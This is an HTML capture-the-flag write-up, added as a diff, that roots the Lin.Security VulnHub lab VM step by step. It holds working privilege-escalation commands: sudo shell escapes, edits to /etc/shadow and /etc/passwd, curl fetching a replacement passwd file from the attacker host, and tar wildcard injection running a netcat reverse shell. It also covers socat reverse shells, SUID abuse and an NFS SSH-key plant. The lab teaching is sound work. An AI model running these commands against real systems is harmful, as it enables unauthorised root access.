@@ -1,0 +1,239 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Hack the Lin.Security VM (Boot to Root)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-lin-security-vm-boot-to-root/" rel="bookmark"><time class="entry-date published" datetime="2018-07-15T13:35:55+00:00">July 15, 2018</time><time class="updated" datetime="2025-06-10T20:12:17+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">As we know how some weak misconfiguration sudo rights can lead to root privilege escalation and today I am going to solve the CTF “Lin. Security – Vulnhub” which is a design on weak sudo right permissions for beginners to test their skill set through this VM.</span></p>
+<p><span style="color: #000000;">This lab has been designed by the researcher to help us understand, how certain built-in applications and services if misconfigured, may be abused by an attacker. Here an up-to-date Ubuntu distro (18.04 LTS) suffers from a number of vulnerabilities that allow a user to escalate to root on the box.</span></p>
+<p><span style="color: #000000;">You can download it from here: <a style="color: #000000;" href="https://www.vulnhub.com/entry/linsecurity-1,244/">https://www.vulnhub.com/entry/linsecurity-1,244/</a></span></p>
+<p><span style="color: #000000;"><strong>Task:</strong> Get root shell for ALL Users (Bob, Susan, Peter)</span></p>
+<p><span style="color: #000000;"><strong>Level</strong>: Beginner to Advance</span></p>
+<h3><span style="color: #800000;"><strong>Penetrating Methodologies </strong></span></h3>
+<p><span style="color: #000000;"><strong>Escalate root shell for Bob</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Via sudo right</span></li>
+<li><span style="color: #000000;">Via wildcard Injection</span></li>
+<li><span style="color: #000000;">Via SUID Binaries</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Escalate root shell for Susan</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Via SUID Binaries</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Escalate root shell for Peter</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Via Network file sharing (NFS)</span></li>
+</ul>
+<p><span style="color: #000000;"><em><span style="color: #000000;">Note: Kindly follow the reference link given in the article for details, because this machine vulnerable to a bunch of services and reference link holds detail of each Privilege Escalation Techniques.</span></em></span></p>
+<h3><span style="color: #800000;"><strong>Escalate root shell for Bob</strong></span></h3>
+<h3><span style="color: #000000;"><strong>1<sup>st</sup> Procedures </strong></span></h3>
+<ul>
+<li><span style="color: #000000;">Login using ssh credential</span></li>
+<li><span style="color: #000000;">Check sudoers list for sudo permissions</span></li>
+<li><span style="color: #000000;">Get root shell via system binaries having sudo permission</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Let’s move now to find ways to root this lab!!</strong></span></p>
+<p><span style="color: #000000;">The first thing before doing any of the CTF is to read the instructions carefully before starting your vulnerability assessment and save your precious time.</span></p>
+<p><span style="color: #000000;">The writer of the lab has given a hint in terms of user-id &amp; password of one of the users.</span></p>
+<p><span style="color: #000000;">It is “To get started you can log onto the host with the credentials: <strong>bob/secret</strong>“ and the IP of my lab is 192.168.1.104.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Jd5ePpQuJqE/XEwzzXL99GI/AAAAAAAAca0/-e9zv6nLKtQEgNqhx6i9ka0BFw35k3cgQCLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">I used the <strong>port 22 (SSH)</strong> to login into the machine with given credentials:<strong> bob/secret</strong></span></p>
+<pre class="lang:default decode:true">ssh bob@192.168.1.104</pre>
+<p><span style="color: #000000;">After ‘logging in’ I tried to check the sudo rights for user bob:</span></p>
+<pre class="lang:default decode:true">sudo -l</pre>
+<p><span style="color: #000000;">The next prompt asked for the root password and I tried the same credentials “secret” and it worked!! I can see all the permissions which bob has and now I can easily root the machine using any of these permitted commands.</span></p>
+<p><span style="color: #000000;">Visit given below link for complete details:</span></p>
+<p><span style="color: #000000;"><a style="color: #000000;" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></span></p>
+<p><span style="color: #000000;"><a style="color: #000000;" href="https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/">https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/</a></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-k5n9-vkjC3I/XEwz1JddFpI/AAAAAAAAcbU/QGZ-jksaJgMOAdzisYPUoLF8P9OYYLKqgCLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">As you can observe that we had escalated root shell when sudo have rights for all types of the shell such as ksh, zsh, bash and so on or for editors or for other programs such as pico, vi, Perl, scp, find, less and so on. It goes in a privileged environment with elevated privileges to access the file system or elevate root shell if sudo permission is enabled.</span></p>
+<p><span style="color: #000000;">You can use the following list of command to get a root shell:</span></p>
+<pre class="lang:default decode:true">sudo ash
+sudo awk 'BEGIN {system("/bin/bash")}'
+sudo bash
+sudo sh
+sudo csh
+sudo dash
+sudo tclsh
+sudo zsh
+find /home -exec /bin/bash \;</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-pVADZqoFJzM/XEwz2z39zII/AAAAAAAAcbo/NQl_W0W4ytM_A6_gaH4KgR7Acy1gbEL4ACLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;"><strong>Get root shell via FTP, Expect, Socat </strong></span></p>
+<p><span style="color: #000000;">With this, we can spawn the interactive system shell and can get away from low-privilege environments. It goes in a privileged environment with elevated privileges to access the file system or elevate root shell if sudo permission is enabled.</span></p>
+<pre class="lang:default decode:true ">sudo ftp
+!/bin/bash
+id
+sudo expect -i
+sudo env /bin/bash
+sudo ed
+!/bin/bash
+id
+sudo perl -e 'exec' "/bin/bash";'
+sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.109:1234</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-f1s1yNpYWBk/XEwz5P8qS6I/AAAAAAAAccQ/bH57RjZUNaIUztX9WljKlf8ox8qIhzGwgCLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">On other you should be in listening mode by using socat listener in your local machine to get privilege shell:</span></p>
+<pre class="lang:default decode:true">socat file:'tty',raw,echo=0 tcp-listen:1234</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-MGqP8Lr6lzQ/XExIFOhPuXI/AAAAAAAAcdQ/f56yzJpQtv4yC_qT2hhrHIlRwxHC4JnjQCLcBGAs/s1600/5.png"/></p>
+<p><span style="color: #000000;"><strong>Less</strong></span></p>
+<p><span style="color: #000000;">With less, we can spawn the interactive system shell and can get away from low-privilege environments. It goes in a privileged environment with elevated privileges to access the file system or elevate root shell if sudo permission is enabled.</span></p>
+<pre class="lang:default decode:true">sudo less /etc/hosts</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-3IL9kuB5YAk/XEwz6nywy5I/AAAAAAAAccs/pDW1MG8c1Uo3dUo1vcYmgPwpqxVxmbFhwCLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">As we know it opens the file in vi mode and since you have run the command with sudo right which means we can get a shell through it. Execute <strong>!bash</strong> command inside hosts file as shown above and you will get the root shell.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-1J5WDCDUaF4/XEwzzGUXq_I/AAAAAAAAcas/6wqc1bbWvrM4l6Nln_YzSYzFniMLkBaVACLcBGAs/s1600/10.png"/></span></p>
+<p><span style="color: #000000;"><strong>Man </strong></span></p>
+<p><span style="color: #000000;">Man can be used to break out from restricted environments by spawning an interactive system shell.</span></p>
+<pre class="lang:default decode:true">sudo man /etc/hosts</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Eq1ED0YdL1c/XEwzzP_Ym6I/AAAAAAAAcaw/1NJlLom2FnIZ9S8SWPR2Bd-WH6yHMdMDwCLcBGAs/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">As we know it opens the file in vi mode and since you have run the command with sudo right which means we can get a shell through it. Execute <strong>!bash</strong> command inside hosts file as shown above and you will get a root shell.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-KD0soYr-ERc/XEwz0NarzWI/AAAAAAAAca4/pdOp1W1HzXETPh0xZ-iLfPsqZGQYv96SQCLcBGAs/s1600/12.png"/></span></p>
+<p><span style="color: #000000;"><strong>Git</strong></span></p>
+<p><span style="color: #000000;">With this, we can spawn the interactive system shell and can get away from low-privilege environments. It goes in a privileged environment with elevated privileges to access the file system or elevate root shell if sudo permission is enabled.</span></p>
+<pre class="lang:default decode:true">sudo git help status</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-KTLhBj3kbRc/XEwz0MKDV_I/AAAAAAAAcbA/6xSBTayDvlU_dEw7qZare_JrGrT-s4eewCLcBGAs/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">As we know it opens the file in vi mode and since you have run the command with sudo right which means we can get a shell through it. Execute <strong>!bash</strong> command inside git status file as shown above and you will get a root shell.</span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://3.bp.blogspot.com/-UnF56qqbde8/XEwz0NpGIlI/AAAAAAAAca8/Ats2mTQ-xgE505_O9nHL79mWxf2u3UM_ACLcBGAs/s1600/14.png"/></strong></span></p>
+<p><span style="color: #000000;"><strong>Pico </strong></span></p>
+<p><span style="color: #000000;">Since we know that pico is a text editor such as nano and vi also has sudo permission, which means that now we can also edit system files. Now open /etc/shadow file with pico editor and try to modify the root password.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-eA8jv8l3gas/XEwz1NusTEI/AAAAAAAAcbM/NBiidabijnM-IAU_xNCgnkA2N3y8ouZBgCLcBGAs/s1600/15.png"/></span></p>
+<p><span style="color: #000000;">On other hands, I have generated a new encrypted password: pass123 using OpenSSL passwd</span></p>
+<pre class="lang:default decode:true">openssl passwd -1 -salt abc pass123</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-cZ5eWkgnOSU/XEwz0jPBRkI/AAAAAAAAcbE/U8Vydn0QU2odtJKgLaxIY8YWl1H_vA3NACLcBGAs/s1600/16.1.png"/></span></p>
+<p><span style="color: #000000;">Now paste the above generated encrypted password inside shadow file for user root.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-R5b6lRo4Dio/XEwz0t7mjdI/AAAAAAAAcbI/KAI9XcuXAzk6KC7kOBNwE_rGELhD6UJRACLcBGAs/s1600/16.png"/></span></p>
+<p><span style="color: #000000;">Since we have modified the root password into pass123, therefore, let get root login using it.</span></p>
+<pre class="lang:default decode:true">su root</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-WMIMnpcsrQ4/XEwz1LqD54I/AAAAAAAAcbQ/SrfUlyDD3-UREEo-VfnxaTxLVy4lntGuwCLcBGAs/s1600/17.png"/></span></p>
+<p><span style="color: #000000;"><strong>SCP</strong></span></p>
+<p><span style="color: #000000;">It can be used to break out from restricted environments by spawning an interactive system shell. It runs in privileged context and may be used to access the file system, escalate or maintain access with elevated privileges if enabled on sudo.</span></p>
+<pre class="lang:default decode:true">hack=$(mktemp)
+echo "/bin/bash 0&lt;&amp;2 1&gt;&amp;2" &gt; $hack
+chmod +x "$hack"
+sudo scp -S $hack abc abd:
+id</pre>
+<p><img decoding="async" src="https://2.bp.blogspot.com/-tuCIE0dgIPc/XEwz1aqrsFI/AAAAAAAAcbY/qWLUZdZs5SwqD4uTTCa9E6q96H5LEca6ACLcBGAs/s1600/26.png"/></p>
+<p><span style="color: #000000;"><strong>SSH</strong></span></p>
+<p><span style="color: #000000;">With this, we can spawn the interactive system shell and can get away from low-privilege environments. It goes in a privileged environment with elevated privileges to access the file system or elevate root shell if sudo permission is enabled. Let’s spawn an interactive root shell through Proxy Command option.</span></p>
+<pre class="lang:default decode:true">sudo ssh -o ProxyCommand=";/bin/bash 0&lt;&amp;2 1&gt;&amp;2" abc
+id</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-gX3_rONyFWE/XEwz2HYPB2I/AAAAAAAAcbc/VO1avoy9Fm0LKr9ayMk5vCMVRwaWqP60gCLcBGAs/s1600/27.png"/></span></p>
+<p><span style="color: #000000;"><strong>Curl</strong></span></p>
+<p><span style="color: #000000;">With this, we can spawn the interactive system shell and can get away from low-privilege environments. Since we have a low privilege shell which means, we can access /etc/passswd file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/--n41znglQlM/XEwz2cSLIeI/AAAAAAAAcbg/fwxBi-sgiy0FY3MrUU47Zbkmzv5wOJC9gCLcBGAs/s1600/28.png"/></span></p>
+<p><span style="color: #000000;">So, I copied /etc/passwd file in my local machine and removed encrypted password for user “insecurity”.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-4g_nAXg4D1g/XEwz2RzvkzI/AAAAAAAAcbk/q1ZuYKKjeIQ8dKSTEc4aR3JA2LXEkuFmgCLcBGAs/s1600/29.png"/></span></p>
+<p><span style="color: #000000;">By running curl with sudo permission we can fetch a remote file via http-get method.</span></p>
+<pre class="lang:default decode:true">sudo curl http://192.168.1.38/passwd -o /etc/passwd</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-mekPct7xlBc/XEwz3FvYuRI/AAAAAAAAcbs/CkX9GEDdk7glO9qwgIo3krmJ0o1RHr3SgCLcBGAs/s1600/30.png"/></span></p>
+<p><span style="color: #000000;">So, as you can observe that now we are having modified passwd file where user insecurity has an entry with UID: GID 0:0 and no password.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-LlHtHHbSiVw/XEwz3uuA3MI/AAAAAAAAcb0/h3xVNK3JzWQwUOVxTxdxi-8Txz9NNt8BACLcBGAs/s1600/31.png"/></span></p>
+<p><span style="color: #000000;">Since we have modified the insecurity password into the blank password, therefore, let get root login using it.</span></p>
+<pre class="lang:default decode:true">sudo -u insecurity bash</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-tm_ioxb6McM/XEwz3aP9XbI/AAAAAAAAcbw/3FcwXxZsMdoQbkhJ2G4M1kUcmqwCyv_cACLcBGAs/s1600/32.png"/></span></p>
+<p><span style="color: #000000;"><strong>Vi Editor </strong></span></p>
+<p><span style="color: #000000;">With this, we can spawn the interactive system shell and can get away from low-privilege environments. It goes in a privileged environment with elevated privileges to access the file system or elevate root shell if sudo permission is enabled.</span></p>
+<p><span style="color: #000000;">Type following:</span></p>
+<pre class="lang:default decode:true">sudo vi
+:!sh
+id</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VSLybp1RrAY/XEwz3o4mcEI/AAAAAAAAcb4/b5HkMu60m0sZS2Vhywtni7lu2glXzHz1gCLcBGAs/s1600/35.png"/></span></p>
+<p><span style="color: #000000;">All you can observe that I have root shell after this.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-oD_QieDJ0uY/XEwz4JaTt1I/AAAAAAAAccA/EfhoqDDowA4opa2D5k0n9GWkgqq9K7TuACLcBGAs/s1600/36.png"/></span></p>
+<p><span style="color: #000000;"><strong>Rvim</strong></span></p>
+<p><span style="color: #000000;">With rvim, we can spawn the root shell and can get away from low-privilege environments. It goes in a privileged environment with elevated privileges to access the file system or elevate root shell if sudo permission is enabled. This requires that rvim is compiled with Python support. Prep-end: py3 for Python 3. Now enter following command to spawn /bin/sh shell with higher privilege shell.</span></p>
+<pre class="lang:default decode:true">sudo rvim -c ":py3 import pty; pty.spawn('/bin/bash')"</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-UgseJtcntvM/XEwz4H1uMXI/AAAAAAAAcb8/ZxrYiOYbyHInsdd0Q_KFTE-efRvlmVIIACLcBGAs/s1600/37.png"/></span></p>
+<p><span style="color: #000000;">You will see, it opens the file in vi mode and since you have run the command with sudo right which means we can get a shell through it. Execute <strong>!bash</strong> command inside it as shown below and you will get a root shell.</span></p>
+<pre class="lang:default decode:true">!bash
+id</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-mx8aNqSywso/XEwz4QvZHBI/AAAAAAAAccE/Y5LHzzW9bOIZMWQIUtgyqlPHmvKdU0IXgCLcBGAs/s1600/38.png"/></span></p>
+<h3><span style="color: #000000;"><strong>2<sup>nd</sup> Procedures</strong></span></h3>
+<ul>
+<li><span style="color: #000000;">Wildcard Injection</span></li>
+<li><span style="color: #000000;">Check cron job</span></li>
+<li><span style="color: #000000;">Generate one-liner for the netcat_reverse shell (msfvenom)</span></li>
+<li><span style="color: #000000;">Exploit tar wildcard injection</span></li>
+<li><span style="color: #000000;">Spawn root shell through netcat session</span></li>
+</ul>
+<p><span style="color: #000000;">Now open crontab to view if any task is scheduled.</span></p>
+<p><span style="color: #000000;"><strong>cat /etc/crontab</strong></span></p>
+<p><span style="color: #000000;">Here we notice the target has scheduled a bash program script for every 1 minute and we know that cron job runs as root. The minute attacker read the program written inside /etc/cron.daily/backup the script, since it is saving a compressed copy of each user’s home directories to /etc/backups. Therefore we can apply tar wildcard injection.</span></p>
+<p><span style="color: #000000;">Visit below link to read complete detail of wildcard injection attack: <em><a style="color: #000000;" href="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/">https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/</a></em></span></p>
+<p><span style="color: #000000;">On a new terminal in your Kali to generate netcat reverse shell malicious code for achieving netcat reverse connection by using msfvenom and enter the following command for that:</span></p>
+<pre class="lang:default decode:true">msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.109 lport=8888 R</pre>
+<p><span style="color: #000000;">Now copy the generated payload and paste inside the victim’s shell as described below.</span></p>
+<pre class="lang:default decode:true">echo "mkfifo /tmp/ckrkrjp; nc 192.168.1.109 8888 0&lt;/tmp/ckrkrjp | /bin/sh &gt;/tmp/ckrkrjp 2&gt;&amp;1; rm /tmp/ckrkrjp" &gt; shell.sh
+echo "" &gt; "--checkpoint-action=exec=sh shell.sh"
+echo "" &gt; --checkpoint=1</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-fnhNrx4fvBQ/XEwz4mkra8I/AAAAAAAAccI/BSaskdwNyk0Okck1M32yGS0k3CfuGBxBACLcBGAs/s1600/39.png"/></span></p>
+<p><span style="color: #000000;">Since the tar command is running as root due to crontab, this has the effect of spawning a netcat shell and sending it to the attack platform on port 8888. And if you go back to the terminal window where the listener was on, you will have victim’s reverse connection in after 1 minute.</span></p>
+<pre class="lang:default decode:true">nc -lvp 8888
+id</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://2.bp.blogspot.com/-U6u3LN8evZU/XEwz4zlWDzI/AAAAAAAAccM/RX_Y61_nWhM3tEzTpOSUaG-y4Vmx1R3QgCLcBGAs/s1600/40.png"/></strong></span></p>
+<h3><span style="color: #000000;"><strong>3<sup>rd</sup> Procedures</strong></span></h3>
+<ul>
+<li><span style="color: #000000;">Identify SUID binaries with a find command</span></li>
+<li><span style="color: #000000;">Exploit SUID binary</span></li>
+</ul>
+<pre class="lang:default decode:true">find / -perm -u=s -type f 2&gt;/dev/null</pre>
+<p><span style="color: #000000;">Here xxd and taskset are system binaries file having suid permissions and with this, we can spawn the interactive system shell and can get away from low-privilege environments.</span></p>
+<p><span style="color: #000000;">Visit below link to read complete detail of SUID Privilege Escalation:</span></p>
+<p><span style="color: #000000;"><a style="color: #000000;" href="https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/">https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/</a></span></p>
+<p><span style="color: #000000;">It was quite easy to get root shell through taskset but fail to get privilege via xxd, although you can execute below command to get a root shell.</span></p>
+<pre class="lang:default decode:true">taskset 1 /bin/sh -p</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://3.bp.blogspot.com/-0Pz4v_4U8VE/XEwz5MfKM9I/AAAAAAAAccU/5oYuR67r2XkeT8__zjTkYL4H3Xi6-jcXACLcBGAs/s1600/41.png"/></strong></span></p>
+<h3><span style="color: #800000;"><strong>Escalate root shell for Susan </strong></span></h3>
+<h3><span style="color: #000000;"><strong>Procedures:</strong></span></h3>
+<ul>
+<li><span style="color: #000000;">Identify the SUID Binary with the find command</span></li>
+<li><span style="color: #000000;">Exploiting SUID binary</span></li>
+<li><span style="color: #000000;">Read /etc/shadow through xxd</span></li>
+<li><span style="color: #000000;">Get root password</span></li>
+<li><span style="color: #000000;">Crack root password</span></li>
+<li><span style="color: #000000;">Get Root shell</span></li>
+</ul>
+<p><span style="color: #000000;">Let’s get into <em>/home</em> directory where we discover 3 users’ directory <strong>bob</strong>,<strong> susan</strong>, and <strong>peter</strong>. Since we have escalated root shell via bob in all possible way but now I’m curious in penetrating <strong>/susan</strong> directory. So while exploring /susan; I found password “MySuperS3cretValue!” from inside <strong>.secret</strong></span></p>
+<p><span style="color: #000000;">So we logged as Susan with the help of password we found inside .secret, next we need escalated root privilege because we are again in low privilege shell. As we knew xxd has suid permission, therefore, we try to escalate root privilege with the following command</span></p>
+<p><span style="color: #000000;">xxd is a Linux command that creates a hex dump of a given file when it has read permissions and as we know SUID bit is enabled for xxd hence we can use it to read the information of /etc/shadow file.</span></p>
+<pre class="lang:default decode:true">xxd "/etc/shadow" | xxd -r</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-7dk0t_-XGt0/XEwz58jmWrI/AAAAAAAAccY/A2CXwu29GhoOjeXlM0iTkBJ7kk2kO63sQCLcBGAs/s1600/43.png"/></span></p>
+<p><span style="color: #000000;">Once you have shadow file on your screen, copy the encrypted text for user root and crack it either with john the ripper or other resources.  So I have used online hash cracking tools and found the root password “secret123” and logged with it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-KQwoR3Tdddo/XEwz55hiEvI/AAAAAAAAccc/vqAE10qXfMMsq93WUcuoPpsSzdBZUjNNwCLcBGAs/s1600/44.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Escalate root shell for Peter</strong></span></h3>
+<h3><span style="color: #000000;"><strong>Procedures:</strong></span></h3>
+<ul>
+<li><span style="color: #000000;">Exploiting NFS</span></li>
+<li><span style="color: #000000;">Mount share directory</span></li>
+<li><span style="color: #000000;">Create SSH pair key</span></li>
+<li><span style="color: #000000;">Replace your pub_key to users’ authorized_keys</span></li>
+<li><span style="color: #000000;">Get SSH login session for peter</span></li>
+<li><span style="color: #000000;">Exploit Sudo right to get a root shell</span></li>
+</ul>
+<p><span style="color: #000000;">On scanning its network we found port 2049 is open for a network share, therefore, we run showmount command to identify share directory</span></p>
+<pre class="lang:default decode:true">showmount -e 192.168.1.104
+mkdir /tmp/raj
+mount 192.168.1.104:/home/peter /tmp/raj
+ls -al /tmp/raj</pre>
+<p><span style="color: #000000;">But I mount /home/peter in our /tmp/raj directory, I didn’t find anything here, truthfully when I try to create .ssh directory, it gave permission denied error, therefore, I create a fake peter account with a UID of 1001 on my Kali machine and successfully created .ssh folder as shown below steps.</span></p>
+<pre class="lang:default decode:true">groupadd -g 1005 peter
+adduser peter -uid 1001 -gid 1005</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jxv4rEF9Up8/XEwz6L8h-1I/AAAAAAAAccg/4XmXPRSqb0kR1--xax9BUOdU64liI6xFgCLcBGAs/s1600/45.png"/></span></p>
+<p><span style="color: #000000;">Now create SSH pair key and add your public SSH key to the users’ authorized_keys file and it allows you to log in as the target user, assuming that you have the appropriate private key.</span></p>
+<p><span style="color: #000000;">Therefore follow the below steps:</span></p>
+<pre class="lang:default decode:true">ssh-keygen
+cd /tmp/raj
+mkdir .ssh
+cat ~/.ssh/id_rsa.pub &gt;&gt; /tmp/raj/.ssh/authorized_keys
+ssh peter@192.168.1.104</pre>
+<p><span style="color: #000000;">Booomm!! Booomm!! We’re logged in as Peter. There multiple ways to exploit NFS services, it totally depends on the situation. Visit the link below to learn more about NFS Privilege Escalation:</span></p>
+<p><span style="color: #000000;"><a style="color: #000000;" href="https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/">https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/</a></span></p>
+<p><span style="color: #000000;">Now let’s check peter’s sudo permission for user peter:</span></p>
+<pre class="lang:default decode:true">sudo -l</pre>
+<p><span style="color: #000000;">So, here peter can run strace commands with sudo which means we can spawn the interactive system shell and can get away from low-privilege environments. It goes in a privileged environment with elevated privileges to access the file system or elevate root shell if sudo permission is enabled</span></p>
+<pre class="lang:default decode:true">sudo strace -o /dev/null /bin/sh</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-n8ETJBpd8O0/XEwz6UYk3MI/AAAAAAAAcck/urdlFGbGmjcpsav9mbL9LbnmPEBJ7VbJACLcBGAs/s1600/46.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: <strong>Devender Kumar</strong>, An IT security Specialist and Post Graduate in Cyber Law &amp; Cyber Forensics. You can Contact him<a class="broken_link" style="color: #000000;" href="https://www.linkedin.com/in/devendersaini/"><strong> here</strong></a> </span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
